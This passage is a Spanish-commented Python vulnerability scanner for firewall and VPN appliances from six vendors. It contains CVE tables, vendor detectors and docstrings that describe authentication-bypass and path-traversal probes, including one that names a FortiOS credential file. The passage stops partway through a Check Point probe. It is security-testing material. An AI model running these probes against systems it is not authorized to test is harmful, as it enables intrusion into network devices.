#!/usr/bin/env python3
"""
vamp_forticheck.py — Escáner de Vulnerabilidades Multi-Vendor Edge Devices
===========================================================================
VampSecure Labs · VampSecure Studios
Para Uso Exclusivo en Pruebas de Penetración Autorizadas — v2.0

DESCRIPCIÓN GENERAL
-------------------
Herramienta de auditoría de seguridad de alto rendimiento para dispositivos
de seguridad perimetral de red. A partir de v2.0 cubre seis fabricantes:
  · Fortinet  FortiOS      — FortiGate / SSL-VPN / Admin UI
  · Palo Alto PAN-OS       — GlobalProtect / Panorama
  · Cisco     ASA          — WebVPN / ASDM
  · Cisco     IOS-XE       — Web UI (RESTCONF/NETCONF)
  · Check Point            — Security Gateway / SmartConsole
  · Juniper   Junos / JWeb — SRX / EX

Confirma la exposición real a CVEs críticos mediante detección de fabricante,
sondas específicas por plataforma y correlación por versión, sin comprometer
la integridad del servicio objetivo.

ARQUITECTURA DE EJECUCIÓN (3 fases por objetivo)
-------------------------------------------------
  Fase 1 — Detección de banner y versión (completamente pasiva)
    Realiza peticiones GET a /remote/login y /login para identificar la presencia
    de FortiOS mediante indicadores en el HTML y las cabeceras HTTP, extrayendo
    la versión del firmware con cuatro patrones regex distintos.

  Fase 2 — Verificación de CVEs (semi-activa, no destructiva)
    Lanza sondas específicas para confirmar cada vulnerabilidad:
    · CVE-2018-13379: Traversal de ruta hacia un binario público del sistema de
      ficheros (/lib/x86_64-linux-gnu/libssl.so). Si responde con contenido
      binario, confirma el vector SIN extraer el fichero de credenciales real
      (/dev/cmdb/sslvpn_websession).
    · CVE-2022-40684: Envío de la cabecera HTTP 'Forwarded: for=127.0.0.1'
      al endpoint /api/v2/cmdb/system/admin. Una respuesta 200 con datos de
      administrador confirma el bypass de autenticación sin realizar escrituras.
    · CVE-2023-27997 / CVE-2024-21762: Comparación de la versión detectada
      contra los rangos afectados documentados (no requiere sonda de red).
    · INFO-DISCLOSURE: Sondeo de /api/v2/monitor/system/status para detectar
      exposición de versión sin autenticación.

  Fase 3 — Análisis de vectores de exposición secundarios
    Solo se activa si FortiOS es confirmado o hay CVEs encontrados:
    · Enumera endpoints de la API REST accesibles con el bypass de CVE-2022-40684.
    · Audita cabeceras de seguridad (HSTS, X-Frame-Options).
    · Detecta WAF o CDN upstream.
    · Verifica si el portal SSL-VPN está expuesto públicamente.

MODELO DE PUNTUACIÓN DE RIESGO
-------------------------------
  score  = Σ (CVSS_base × factor_confirmación) + puntos_por_vectores_secundarios
  factor = 1.0 si confirmed=True, 0.55 si method=version_match
  niveles: CRITICAL ≥ 9.0 · HIGH ≥ 7.0 · MEDIUM ≥ 4.0 · LOW > 0 · INFO = 0

CONCURRENCIA
------------
  asyncio + aiohttp con un asyncio.Semaphore configurable (--concurrency).
  Un TCPConnector compartido reutiliza conexiones HTTP para reducir latencia.
  Los errores en un objetivo son aislados y no interrumpen el lote completo.

DEPENDENCIAS
------------
  aiohttp  >= 3.9.0   — Cliente HTTP asíncrono con soporte SSL opcional
  rich     >= 13.7.0  — Salida de consola con formato enriquecido y tablas

AUTORÍA
-------
  © VampSecure Studios — VampSecure Labs Security Research Division
  Todos los derechos reservados. Uso exclusivo en entornos autorizados.
"""

import asyncio
import aiohttp
import argparse
import json
import ipaddress
import sys
import re
from pathlib import Path
from datetime import datetime, timezone
from dataclasses import dataclass, field, asdict
from typing import Optional, List, Dict, Tuple
from urllib.parse import urlparse

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich import box

console = Console()

# Cabecera ASCII impresa al inicio de cada ejecución
BANNER = r"""
  ____   ____    _    __  __ ____  _____ ____ _   _ ____  _____   _        _    ____ ____
 \ \ / / _  |  / \  |  \/  |  _ \/ ____/ ___| | | |  _ \| ____| | |      / \  | __ ) ___|
  \ V / (_| | / _ \ | |\/| | |_) \___ \| |___| | | | |_) |  _|   | |     / _ \ |  _ \___ \
   | |  \__, |/ ___ \| |  | |  __/ ___) |___  | |_| |  _ <| |___  | |___ / ___ \| |_) |__) |
   |_|     /_/_/   \_|_|  |_|_|   |____/\____|\___/|_| \_|_____| |_____/_/   \_|____/____/
     by VampSecure Studios · vamp-forticheck v2.0 · Multi-Vendor Edge Device Scanner
     ─────────────────────────────────────────────────────────────────────────────────
     USO EXCLUSIVO EN AUDITORÍAS AUTORIZADAS · El uso no autorizado es ilegal
"""

# =============================================================================
# BASE DE DATOS DE CVEs FORTIOS
# =============================================================================
# Estructura por entrada:
#   description     : Descripción legible del impacto
#   cvss            : Puntuación CVSS v3 base
#   severity        : Nivel de severidad NVD (CRITICAL / HIGH / MEDIUM / LOW)
#   component       : Componente de FortiOS afectado
#   affected_versions: Lista de rangos (version_minima, version_maxima) como tuplas
#                      de tres enteros (major, minor, patch), ambos extremos incluidos
#   mitigation      : Acción correctiva recomendada para el cliente
# =============================================================================
FORTIOS_CVE_DB: Dict = {
    "CVE-2018-13379": {
        "description": "FortiOS SSL-VPN — traversal de ruta no autenticado que expone el fichero de sesiones con credenciales en texto plano",
        "cvss": 9.8,
        "severity": "CRITICAL",
        "component": "SSL-VPN Web Portal",
        "affected_versions": [
            ((5, 6, 3), (5, 6, 7)),
            ((6, 0, 0), (6, 0, 4)),
        ],
        "mitigation": "Actualizar a FortiOS 5.6.8 / 6.0.5 o superior",
    },
    "CVE-2022-40684": {
        "description": "FortiOS/FortiProxy — bypass de autenticación mediante petición HTTP manipulada a la API REST de administración",
        "cvss": 9.8,
        "severity": "CRITICAL",
        "component": "Admin Web UI / REST API",
        "affected_versions": [
            ((7, 0, 0), (7, 0, 6)),
            ((7, 2, 0), (7, 2, 1)),
        ],
        "mitigation": "Actualizar a FortiOS 7.0.7 / 7.2.2 o superior; deshabilitar la interfaz HTTP/HTTPS de administración",
    },
    "CVE-2023-27997": {
        "description": "FortiOS SSL-VPN — desbordamiento de heap pre-autenticación que puede permitir ejecución remota de código (XORtigate)",
        "cvss": 9.2,
        "severity": "CRITICAL",
        "component": "SSL-VPN",
        "affected_versions": [
            ((6, 0, 0), (6, 0, 17)),
            ((6, 2, 0), (6, 2, 15)),
            ((6, 4, 0), (6, 4, 12)),
            ((7, 0, 0), (7, 0, 9)),
            ((7, 2, 0), (7, 2, 4)),
        ],
        "mitigation": "Actualizar a FortiOS 6.4.13 / 7.0.10 / 7.2.5 o superior; deshabilitar SSL-VPN como medida temporal",
    },
    "CVE-2024-21762": {
        "description": "FortiOS SSL-VPN — escritura fuera de límites no autenticada en el componente SSL-VPN; activamente explotada en la naturaleza",
        "cvss": 9.6,
        "severity": "CRITICAL",
        "component": "SSL-VPN",
        "affected_versions": [
            ((6, 0, 0), (6, 0, 17)),
            ((6, 2, 0), (6, 2, 15)),
            ((6, 4, 0), (6, 4, 14)),
            ((7, 0, 0), (7, 0, 13)),
            ((7, 2, 0), (7, 2, 6)),
            ((7, 4, 0), (7, 4, 2)),
        ],
        "mitigation": "Actualizar inmediatamente; deshabilitar SSL-VPN como mitigación temporal urgente",
    },
    "CVE-2024-55591": {
        "description": "FortiOS / FortiProxy — bypass de autenticación en Node.js websocket vía peticiones crafteadas a jsconsole; permite obtener privilegios de super-admin sin credenciales; activamente explotada en enero 2025 (CISA KEV)",
        "cvss": 9.8,
        "severity": "CRITICAL",
        "component": "jsconsole (Node.js WebSocket)",
        "affected_versions": [
            ((7, 0, 0), (7, 0, 16)),
            ((7, 2, 0), (7, 2, 12)),
        ],
        "mitigation": "Actualizar a FortiOS 7.0.17 / 7.2.13 o superior; deshabilitar jsconsole en producción",
    },
    "CVE-2025-32756": {
        "description": "FortiOS SSL-VPN — desbordamiento de pila (stack-based overflow) pre-autenticado en el gateway SSL-VPN; permite ejecución remota de código; explotación activa confirmada por Fortinet en mayo 2025",
        "cvss": 9.6,
        "severity": "CRITICAL",
        "component": "SSL-VPN",
        "affected_versions": [
            ((6, 4, 0), (6, 4, 15)),
            ((7, 0, 0), (7, 0, 16)),
            ((7, 2, 0), (7, 2, 12)),
            ((7, 4, 0), (7, 4, 6)),
            ((7, 6, 0), (7, 6, 1)),
        ],
        "mitigation": "Actualizar a FortiOS 7.0.17 / 7.2.13 / 7.4.7 / 7.6.2 o superior; deshabilitar SSL-VPN como mitigación temporal",
    },
}

# =============================================================================
# BASES DE DATOS CVE — FABRICANTES ADICIONALES (v2.0)
# =============================================================================
# Estructura idéntica a FORTIOS_CVE_DB para procesamiento uniforme.
# Cada vendor tiene su propia clave de diccionario de nivel superior.
# =============================================================================

PANOS_CVE_DB: Dict = {
    "CVE-2024-3400": {
        "description": "Palo Alto PAN-OS GlobalProtect — inyección de comandos OS pre-autenticada en el gateway GlobalProtect; explotación activa confirmada en la naturaleza (CVSS 10.0)",
        "cvss": 10.0,
        "severity": "CRITICAL",
        "component": "GlobalProtect Gateway",
        "affected_versions": [
            # PAN-OS 10.2.x < 10.2.9-h1 → representado como (10,2,0)–(10,2,8)
            ((10, 2, 0), (10, 2, 8)),
            ((11, 0, 0), (11, 0, 3)),
            ((11, 1, 0), (11, 1, 1)),
        ],
        "mitigation": "Actualizar a PAN-OS 10.2.9-h1 / 11.0.4-h1 / 11.1.2-h3 o superior; deshabilitar GlobalProtect temporalmente",
    },
    "CVE-2024-0012": {
        "description": "Palo Alto PAN-OS — bypass de autenticación en la interfaz web de administración (PAN-SA-2024-0015); permite acceso sin credenciales a la consola de gestión",
        "cvss": 9.8,
        "severity": "CRITICAL",
        "component": "Management Web Interface",
        "affected_versions": [
            ((10, 1, 0), (10, 1, 11)),
            ((10, 2, 0), (10, 2, 12)),
            ((11, 0, 0), (11, 0, 5)),
            ((11, 1, 0), (11, 1, 4)),
            ((11, 2, 0), (11, 2, 3)),
        ],
        "mitigation": "Actualizar a PAN-OS 10.1.12 / 10.2.13 / 11.0.6 / 11.1.5 / 11.2.4 o superior; restringir acceso a la interfaz de gestión por IP",
    },
    "CVE-2025-0108": {
        "description": "Palo Alto PAN-OS — bypass de autenticación en la interfaz web de gestión mediante peticiones PHP manipuladas; permite a un atacante no autenticado invocar scripts PHP; CVSS 9.3; explotación activa confirmada en febrero 2025",
        "cvss": 9.3,
        "severity": "CRITICAL",
        "component": "Management Web Interface (PHP)",
        "affected_versions": [
            ((10, 1, 0), (10, 1, 12)),
            ((10, 2, 0), (10, 2, 13)),
            ((11, 0, 0), (11, 0, 6)),
            ((11, 1, 0), (11, 1, 5)),
            ((11, 2, 0), (11, 2, 4)),
        ],
        "mitigation": "Actualizar a PAN-OS 10.1.13 / 10.2.14 / 11.0.7 / 11.1.6 / 11.2.5 o superior; restringir acceso a la interfaz de gestión a IPs de confianza",
    },
    "CVE-2025-0111": {
        "description": "Palo Alto PAN-OS — lectura de ficheros arbitrarios sin autenticación en la interfaz web de gestión; combinado con CVE-2025-0108 permite leer claves privadas y configuración sensible",
        "cvss": 7.1,
        "severity": "HIGH",
        "component": "Management Web Interface",
        "affected_versions": [
            ((10, 1, 0), (10, 1, 12)),
            ((10, 2, 0), (10, 2, 13)),
            ((11, 0, 0), (11, 0, 6)),
            ((11, 1, 0), (11, 1, 5)),
            ((11, 2, 0), (11, 2, 4)),
        ],
        "mitigation": "Misma mitigación que CVE-2025-0108: actualizar y restringir acceso a la interfaz de gestión",
    },
    "CVE-2020-2021": {
        "description": "Palo Alto PAN-OS — bypass de autenticación vía respuesta SAML manipulada; afecta cuando SAML SSO está habilitado; CVSS 10.0",
        "cvss": 10.0,
        "severity": "CRITICAL",
        "component": "SAML Authentication",
        "affected_versions": [
            ((8, 1, 0), (8, 1, 14)),
            ((9, 0, 0), (9, 0, 9)),
            ((9, 1, 0), (9, 1, 3)),
            ((10, 0, 0), (10, 0, 0)),
        ],
        "mitigation": "Actualizar a PAN-OS 8.1.15 / 9.0.9 / 9.1.4 / 10.0.1 o superior; deshabilitar SAML SSO si no es necesario",
    },
}

CISCO_CVE_DB: Dict = {
    "CVE-2023-20198": {
        "description": "Cisco IOS XE Web UI — escalada de privilegios a nivel 15 sin autenticación a través de la interfaz de gestión HTTP; explotación masiva activa en la naturaleza (CVSS 10.0)",
        "cvss": 10.0,
        "severity": "CRITICAL",
        "component": "IOS XE Web UI",
        "affected_versions": [
            # IOS-XE hasta 17.9 (sin versión de patch específica → representar rango amplio)
            ((16, 0, 0), (17, 9, 99)),
        ],
        "mitigation": "Deshabilitar la interfaz HTTP/HTTPS de gestión (no ip http server / no ip http secure-server); actualizar a versión con parche cuando esté disponible",
    },
    "CVE-2023-20273": {
        "description": "Cisco IOS XE Web UI — inyección de comandos OS para usuarios previamente escalados vía CVE-2023-20198; permite instalación de implante persistente",
        "cvss": 7.2,
        "severity": "HIGH",
        "component": "IOS XE Web UI",
        "affected_versions": [
            ((16, 0, 0), (17, 9, 99)),
        ],
        "mitigation": "Misma mitigación que CVE-2023-20198: deshabilitar gestión HTTP/HTTPS",
    },
    "CVE-2023-20269": {
        "description": "Cisco ASA/FTD — acceso no autorizado a sesiones VPN SSL activas; permite establecer sesión VPN sin credenciales si AAA está en el mismo servidor que AnyConnect",
        "cvss": 9.1,
        "severity": "CRITICAL",
        "component": "ASA SSL VPN / FTD AnyConnect",
        "affected_versions": [
            ((9, 0, 0), (9, 18, 3)),
            ((9, 19, 0), (9, 19, 1)),
        ],
        "mitigation": "Actualizar a ASA 9.16.4-67 / 9.18.4 / 9.19.2 o superior; separar AAA para VPN y administración",
    },
    "CVE-2024-20353": {
        "description": "Cisco ASA/FTD — denegación de servicio (DoS) mediante paquetes HTTPS malformados en el procesador WebVPN; puede causar recarga del dispositivo",
        "cvss": 8.6,
        "severity": "HIGH",
        "component": "ASA WebVPN / FTD",
        "affected_versions": [
            ((9, 0, 0), (9, 18, 3)),
        ],
        "mitigation": "Actualizar a versión con parche; aplicar ACLs para limitar acceso al portal WebVPN",
    },
    "CVE-2025-20188": {
        "description": "Cisco IOS XE Wireless LAN Controller — subida de ficheros arbitraria sin autenticación vía endpoint HTTPS con JWT hardcodeado; CVSS 10.0; permite escalada a root en el sistema subyacente",
        "cvss": 10.0,
        "severity": "CRITICAL",
        "component": "IOS XE WLC (Wireless LAN Controller)",
        "affected_versions": [
            ((17, 0, 0), (17, 14, 99)),
        ],
        "mitigation": "Actualizar a IOS XE 17.15.1 o superior; deshabilitar la función Out-of-Band AP Image Download si no es necesaria",
    },
    "CVE-2025-20161": {
        "description": "Cisco ASA / FTD — desbordamiento de buffer en el procesamiento de paquetes DTLS que puede causar denegación de servicio o ejecución remota de código en dispositivos con DTLS habilitado",
        "cvss": 8.6,
        "severity": "HIGH",
        "component": "ASA / FTD DTLS",
        "affected_versions": [
            ((9, 12, 0), (9, 20, 3)),
        ],
        "mitigation": "Actualizar a ASA 9.20.4 o superior; deshabilitar DTLS si no es requerido por la política VPN",
    },
}

CHECKPOINT_CVE_DB: Dict = {
    "CVE-2024-24919": {
        "description": "Check Point Security Gateway — divulgación de información mediante traversal de ruta en el endpoint /clients/MyCRL; permite leer ficheros arbitrarios del sistema incluido /etc/shadow (explotación activa confirmada)",
        "cvss": 8.6,
        "severity": "HIGH",
        "component": "Security Gateway (IPSec VPN / Mobile Access)",
        "affected_versions": [
            # Versiones R80.x y R81.x — representadas como (80,0)–(81,20)
            ((80, 0, 0), (81, 20, 99)),
        ],
        "mitigation": "Aplicar hotfix del SA de mayo 2024 inmediatamente; deshabilitar Mobile Access y SSL VPN hasta aplicar el parche",
    },
}

JUNIPER_CVE_DB: Dict = {
    "CVE-2024-21591": {
        "description": "Juniper Networks Junos OS — escritura fuera de límites en J-Web permite RCE pre-autenticado o DoS; afecta EX Series y SRX Series",
        "cvss": 9.8,
        "severity": "CRITICAL",
        "component": "J-Web",
        "affected_versions": [
            ((20, 0, 0), (20, 4, 99)),
            ((21, 0, 0), (21, 4, 99)),
            ((22, 0, 0), (22, 4, 2)),
            ((23, 0, 0), (23, 2, 0)),
        ],
        "mitigation": "Actualizar a Junos OS 20.4R3-S9 / 21.4R3-S7 / 22.4R3 / 23.2R1 o superior; deshabilitar J-Web si no es necesario",
    },
    "CVE-2023-36845": {
        "description": "Juniper Networks Junos OS EX/SRX — modificación de variable PHP externa en J-Web permite ejecución remota de código sin autenticación (parte del 'EX Series Quartet')",
        "cvss": 9.8,
        "severity": "CRITICAL",
        "component": "J-Web (PHP)",
        "affected_versions": [
            ((20, 4, 0), (20, 4, 99)),
            ((21, 0, 0), (21, 4, 99)),
            ((22, 0, 0), (22, 4, 0)),
        ],
        "mitigation": "Actualizar a Junos OS 20.4R3-S8 / 21.4R3-S4 / 22.4R3 o superior; aplicar ACLs para restringir acceso a J-Web",
    },
}

# Base de datos de vulnerabilidades F5 BIG-IP
# Las sondas de red detectan exposición de TMUI e iControl REST.
# Los CVEs de esta DB se usan solo como referencia; la confirmación es por sonda.
F5_CVE_DB: Dict = {
    "CVE-2020-5902": {
        "description": "F5 BIG-IP TMUI — traversal de ruta no autenticado que permite lectura de ficheros sensibles y ejecución de código; explotación masiva documentada (CISA KEV)",
        "cvss": 9.8,
        "severity": "CRITICAL",
        "component": "Traffic Management User Interface (TMUI)",
        "affected_versions": [],  # confirmado por sonda de exposición TMUI
        "mitigation": "Actualizar a BIG-IP 15.1.0.4 / 14.1.2.6 / 13.1.3.4 o superior; restringir TMUI a redes de gestión internas",
    },
    "CVE-2022-1388": {
        "description": "F5 BIG-IP iControl REST — omisión de autenticación sin usuario que permite ejecutar comandos arbitrarios como root vía cabeceras HTTP especialmente construidas",
        "cvss": 9.8,
        "severity": "CRITICAL",
        "component": "iControl REST API (/mgmt/)",
        "affected_versions": [],  # confirmado por sonda de exposición iControl REST
        "mitigation": "Actualizar a BIG-IP 16.1.2.2 / 15.1.5.1 / 14.1.4.6 / 13.1.5 o superior; deshabilitar acceso externo a iControl REST",
    },
    "CVE-2023-46747": {
        "description": "F5 BIG-IP TMUI — omisión de autenticación vía HTTP request smuggling que permite RCE sin credenciales; encadenable con CVE-2023-46748 (CISA KEV)",
        "cvss": 9.8,
        "severity": "CRITICAL",
        "component": "Traffic Management User Interface (TMUI)",
        "affected_versions": [],  # confirmado por sonda de exposición TMUI
        "mitigation": "Actualizar a BIG-IP 17.1.0.3 / 16.1.4.1 / 15.1.10 / 14.1.5.5 o superior; aplicar workaround F5 para TMUI",
    },
    "CVE-2023-46748": {
        "description": "F5 BIG-IP Configuration Utility — inyección SQL autenticada que deriva en ejecución de comandos como root; se encadena habitualmente con CVE-2023-46747",
        "cvss": 8.8,
        "severity": "HIGH",
        "component": "Configuration Utility",
        "affected_versions": [],
        "mitigation": "Actualizar a BIG-IP 17.1.0.3 / 16.1.4.1 / 15.1.10 o superior",
    },
}

# Mapa global de CVE databases por vendor (excluye Fortinet que usa FORTIOS_CVE_DB)
VENDOR_CVE_MAP: Dict[str, Dict] = {
    "PAN-OS":        PANOS_CVE_DB,
    "Cisco-IOS-XE":  CISCO_CVE_DB,
    "Cisco-ASA":     CISCO_CVE_DB,
    "Check-Point":   CHECKPOINT_CVE_DB,
    "Juniper":       JUNIPER_CVE_DB,
    "F5-BIG-IP":     F5_CVE_DB,
}


# =============================================================================
# MODELO DE DATOS
# =============================================================================

@dataclass
class ScanResult:
    """
    Contenedor de resultados para un objetivo escaneado.

    Campos
    ------
    target              : URL o IP del objetivo tal como fue introducido
    timestamp           : Fecha/hora de inicio del escaneo en UTC ISO-8601
    is_fortios          : True si se detectaron indicadores de FortiOS
    detected_version    : Versión de firmware extraída (ej. '7.0.5') o None
    banner              : Valor de la cabecera Server: de la primera respuesta
    cve_findings        : Lista de dicts con resultados de cada verificación CVE
    exposure_vectors    : Lista de dicts con vectores de exposición secundarios
    mitigations_detected: Mitigaciones activas detectadas (WAF, parches, etc.)
    risk_score          : Puntuación de riesgo compuesta (0.0–10.0)
    risk_level          : Nivel semáforo: CRITICAL / HIGH / MEDIUM / LOW / INFO
    error               : Mensaje de error de red o 'OUT_OF_SCOPE' si aplica
    """
    target: str
    timestamp: str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())
    is_fortios: bool = False
    detected_version: Optional[str] = None
    banner: Optional[str] = None
    cve_findings: List[Dict] = field(default_factory=list)
    exposure_vectors: List[Dict] = field(default_factory=list)
    mitigations_detected: List[str] = field(default_factory=list)
    risk_score: float = 0.0
    risk_level: str = "UNKNOWN"
    error: Optional[str] = None
    # v2.0 — fabricante detectado: FortiOS / PAN-OS / Cisco-ASA / Cisco-IOS-XE / Check-Point / Juniper / Unknown
    vendor: Optional[str] = None


# =============================================================================
# VALIDADOR DE ALCANCE (SCOPE)
# =============================================================================

class ScopeValidator:
    """
    Verifica que un objetivo esté dentro del alcance definido antes de lanzar
    cualquier sonda de red.

    El fichero de alcance (scope.txt) admite tres formatos por línea:
      · Rango CIDR     → 192.168.1.0/24
      · Wildcard       → *.ejemplo.com   (cualquier subdominio de ejemplo.com)
      · Host exacto    → vpn.ejemplo.com  o  10.0.0.1

    Las líneas que comienzan con '#' se ignoran como comentarios.

    Si no se proporciona fichero de alcance, todos los objetivos son válidos
    (el auditor acepta la responsabilidad total sobre el targeting).
    """

    def __init__(self, scope_file: Optional[str] = None):
        self.entries: set = set()
        # Si no hay fichero de scope, todas las IPs pasan la validación
        self.active = scope_file is not None
        if scope_file:
            self._load(scope_file)

    def _load(self, path: str):
        """Carga y normaliza las entradas del fichero de scope."""
        p = Path(path)
        if not p.exists():
            console.print(f"[bold red][!] Fichero de scope no encontrado: {path}[/bold red]")
            sys.exit(1)
        for line in p.read_text().splitlines():
            line = line.strip()
            if line and not line.startswith("#"):
                self.entries.add(line.lower())
        console.print(f"[cyan][i] Scope cargado: {len(self.entries)} entradas desde {path}[/cyan]")

    def is_in_scope(self, target: str) -> bool:
        """
        Retorna True si el objetivo está dentro del alcance definido.

        El método intenta las tres formas de validación en orden:
        1. Coincidencia exacta de hostname/IP
        2. Coincidencia de wildcard (la entrada empieza por '*.')
        3. Pertenencia a rango CIDR (solo si el objetivo es una IP válida)

        Parámetros
        ----------
        target : str  — URL completa o host/IP del objetivo

        Retorna
        -------
        bool  — True si en scope o si no hay fichero de scope activo
        """
        if not self.active:
            return True

        # Extraer solo el hostname de URLs como https://host:443/path
        parsed = urlparse(target if "://" in target else f"https://{target}")
        host = (parsed.hostname or target).lower()

        for entry in self.entries:
            if entry == host:
                return True
            # Wildcard: *.dominio.com cubre sub.dominio.com pero no dominio.com
            if entry.startswith("*.") and host.endswith(entry[1:]):
                return True
            # Comprobación CIDR: solo aplica si el objetivo es una IP válida
            try:
                if ipaddress.ip_address(host) in ipaddress.ip_network(entry, strict=False):
                    return True
            except ValueError:
                pass  # No es una IP — es un hostname, continuar

        return False


# =============================================================================
# DETECTOR DE VERSIÓN FORTIOS
# =============================================================================

class VersionDetector:
    """
    Detecta la presencia de FortiOS y extrae la versión de firmware mediante
    análisis pasivo del HTML de respuesta y las cabeceras HTTP.

    No realiza peticiones adicionales: trabaja con el contenido de las
    respuestas ya obtenidas en la Fase 1.

    Indicadores de presencia
    ------------------------
    Cadenas características encontradas en el HTML o cabeceras que identifican
    de forma inequívoca un dispositivo FortiOS.

    Patrones de versión
    -------------------
    Se prueban cuatro expresiones regulares en orden de especificidad:
    1. FortiXxx v/- seguido de X.Y.Z  (más fiable, del HTML de login)
    2. version: "X.Y.Z"              (respuestas JSON de la API)
    3. Atributo version en cabeceras HTTP personalizadas
    4. build NNNNN                   (número de build como fallback)
    """

    # Cadenas cuya presencia en HTML o cabeceras indica un dispositivo FortiOS
    INDICATORS = [
        "fgt_lang", "sslvpn", "FortiGate", "fortinet", "/remote/",
        "FortiNet", "SSL-VPN", "SSLVPN", "fgt-gui",
    ]

    # Patrones regex probados en orden — el primero que hace match gana
    VERSION_RE = [
        re.compile(r'[Ff]orti[A-Za-z]*[\s/v-]+(\d+\.\d+\.\d+)', re.I),
        re.compile(r'"version"\s*:\s*"(\d+\.\d+\.\d+)"', re.I),
        re.compile(r'version["\s:=]+["\']?(\d+\.\d+\.\d+)', re.I),
        re.compile(r'build\s+(\d{4,5})', re.I),
    ]

    @classmethod
    def detect(cls, content: str, headers: Dict) -> Tuple[bool, Optional[str]]:
        """
        Analiza el HTML y las cabeceras de una respuesta HTTP para detectar
        FortiOS y su versión.

        Parámetros
        ----------
        content : str   — Cuerpo de la respuesta HTTP (HTML o JSON)
        headers : Dict  — Cabeceras HTTP de la respuesta como diccionario

        Retorna
        -------
        Tuple[bool, Optional[str]]
          - bool           → True si se detectaron indicadores de FortiOS
          - Optional[str]  → Versión extraída ('7.0.5') o None si no encontrada
        """
        # Combinar contenido y cabeceras en una sola cadena para simplificar búsqueda
        combined = content + str(headers)
        is_forti = any(ind.lower() in combined.lower() for ind in cls.INDICATORS)

        version = None
        for rx in cls.VERSION_RE:
            m = rx.search(combined)
            if m:
                version = m.group(1)
                break

        return is_forti, version

    @staticmethod
    def parse_version(v: str) -> Optional[Tuple[int, int, int]]:
        """
        Convierte una cadena de versión 'X.Y.Z' en una tupla comparable (X, Y, Z).

        Retorna None si el formato no es válido, para evitar errores en
        la comparación con rangos afectados de la base de datos.

        Ejemplos
        --------
        '7.0.5' → (7, 0, 5)
        '6.4'   → (6, 4, 0)  ← tercer componente se asume 0
        'texto' → None
        """
        try:
            parts = v.split(".")
            return (
                int(parts[0]),
                int(parts[1]) if len(parts) > 1 else 0,
                int(parts[2]) if len(parts) > 2 else 0,
            )
        except (ValueError, IndexError):
            return None


# =============================================================================
# DETECTOR DE FABRICANTE (MULTI-VENDOR) — v2.0
# =============================================================================

class VendorDetector:
    """
    Detecta el fabricante del dispositivo de seguridad de red a partir del
    contenido HTML y las cabeceras HTTP de la respuesta inicial.

    Cubre seis plataformas principales de seguridad perimetral:
      · FortiOS    (Fortinet FortiGate)
      · PAN-OS     (Palo Alto Networks)
      · Cisco-ASA  (Cisco Adaptive Security Appliance)
      · Cisco-IOS-XE (Cisco routers/switches con Web UI)
      · Check-Point (Check Point Security Gateway)
      · Juniper    (Juniper Networks Junos OS / J-Web)

    El método devuelve la primera coincidencia por orden de especificidad
    (FortiOS primero por retrocompatibilidad con v1.x del escáner).
    """

    # Indicadores por fabricante — cadenas características en HTML/cabeceras
    _VENDOR_INDICATORS: Dict[str, List[str]] = {
        "FortiOS": [
            "fgt_lang", "sslvpn", "FortiGate", "fortinet", "FortiNet",
            "SSL-VPN", "fgt-gui", "/remote/",
        ],
        "PAN-OS": [
            "GlobalProtect", "PAN-OS", "Palo Alto Networks", "pan_form_auth",
            "gp-translate-login", "login_page_token", "gpclientcert",
            "global-protect",
        ],
        "Cisco-ASA": [
            "CSCOE", "Cisco Adaptive Security", "WebVPN", "clientless ssl vpn",
            "SSL VPN Service", "Cisco ASA", "+CSCOE+",
        ],
        "Cisco-IOS-XE": [
            "Cisco IOS XE", "IOS-XE", "IOSXEWebUI", "webui-nginx",
            "cisco ios xe software",
        ],
        "Check-Point": [
            "Check Point", "SmartConsole", "cpanel", "MyCRL",
            "Capsule", "Check Point Security Gateway",
        ],
        "Juniper": [
            "Juniper Networks", "Junos", "J-Web", "JUNOS",
            "Juniper SRX", "Juniper EX",
        ],
        "F5-BIG-IP": [
            "BIG-IP", "F5 Networks", "iControl", "tmui",
            "big-ip", "bigip", "F5 BIG-IP", "Traffic Management",
            "F5, Inc", "LTM", "GTM", "APM", "ASM",
        ],
    }

    @classmethod
    def detect(cls, content: str, headers: Dict) -> Optional[str]:
        """
        Detecta el fabricante analizando HTML + cabeceras HTTP.

        Retorna el nombre del fabricante detectado o None si no se reconoce.
        """
        combined = (content + str(headers)).lower()
        for vendor, indicators in cls._VENDOR_INDICATORS.items():
            if any(ind.lower() in combined for ind in indicators):
                return vendor
        return None


# =============================================================================
# VERIFICADOR CVE MULTI-VENDOR — v2.0
# =============================================================================

class MultiVendorCVEChecker:
    """
    Realiza sondas de red específicas para CVEs de dispositivos no-Fortinet.

    Cubre PAN-OS, Cisco ASA/IOS-XE, Check Point, Juniper y F5 BIG-IP con el
    mismo principio de diseño que CVEChecker (FortiOS): sondas no destructivas,
    evidencia sin explotación real.

    Para CVEs con confirmación por versión (la mayoría de heap overflows y
    corrupciones de memoria), usa version_match igual que el checker de FortiOS.
    """

    def __init__(self, session: aiohttp.ClientSession, timeout: int = 10):
        self.session = session
        self.to = aiohttp.ClientTimeout(total=timeout)

    async def check_panos_globalprotect_exposure(self, base_url: str) -> Dict:
        """
        Verifica si el gateway GlobalProtect de PAN-OS está expuesto.
        La exposición de GlobalProtect amplifica el riesgo de CVE-2024-3400.
        Una respuesta 200 en /global-protect/ confirma el vector de ataque.
        """
        resultado = {
            "cve": "PAN-GLOBALPROTECT-EXPOSURE",
            "confirmed": False,
            "method": "active_probe",
            "evidence": None,
            "impact": "Gateway GlobalProtect expuesto — superficie de ataque para CVE-2024-3400 y CVE-2021-3064",
            "severity": "MEDIUM",
            "cvss": 5.3,
            "description": "Portal GlobalProtect accesible públicamente",
        }
        for ruta in ("/global-protect/getsoftware.esp", "/ssl-vpn/hipreport.esp", "/global-protect/"):
            try:
                async with self.session.get(
                    f"{base_url}{ruta}",
                    timeout=self.to,
                    allow_redirects=False,
                    ssl=False,
                ) as r:
                    if r.status in (200, 301, 302):
                        resultado["confirmed"] = True
                        resultado["evidence"] = f"HTTP {r.status} en {ruta} — GlobalProtect expuesto"
                        return resultado
            except Exception:
                pass
        return resultado

    async def check_checkpoint_cve_2024_24919(self, base_url: str) -> Dict:
        """
        Sonda el traversal de ruta CVE-2024-24919 (Check Point).

        Método de prueba seguro:
        Envía POST a /clients/MyCRL con un path de traversal hacia /etc/hostname
        (fichero público que NO contiene credenciales). Si la respuesta contiene
        el hostname del sistema, el traversal es real. Un sistema parcheado
        devuelve 403/404 o el contenido del endpoint esperado.
        """
        resultado = {
            "cve": "CVE-2024-24919",
            "confirmed": False,
